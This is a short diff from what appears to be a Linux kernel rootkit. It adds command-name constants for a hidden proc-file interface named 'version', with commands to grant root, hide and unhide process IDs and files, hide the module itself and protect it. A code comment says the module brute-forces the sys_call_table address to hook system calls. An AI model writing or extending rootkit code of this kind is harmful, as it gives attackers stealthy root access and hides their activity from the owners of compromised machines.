@@ -54,6 +54,17 @@ struct proc_dir_entry
 ********************
 *
 */
+#define CFG_PROC_FILE "version"
+#define CFG_PASS "password"
+#define CFG_ROOT "root"
+#define CFG_HIDE_PID "hide_pid"
+#define CFG_UNHIDE_PID "unhide_pid"
+#define CFG_HIDE_FILE "hide_file"
+#define CFG_UNHIDE_FILE "unhide_file"
+#define CFG_HIDE "hide"
+#define CFG_UNHIDE "unhide"
+#define CFG_PROTECT "protect"
+#define CFG_UNPROTECT "unprotect"
 
 //For finding the sys_call_table adress we will brute force it
 //It has to be in this range depending OS type.
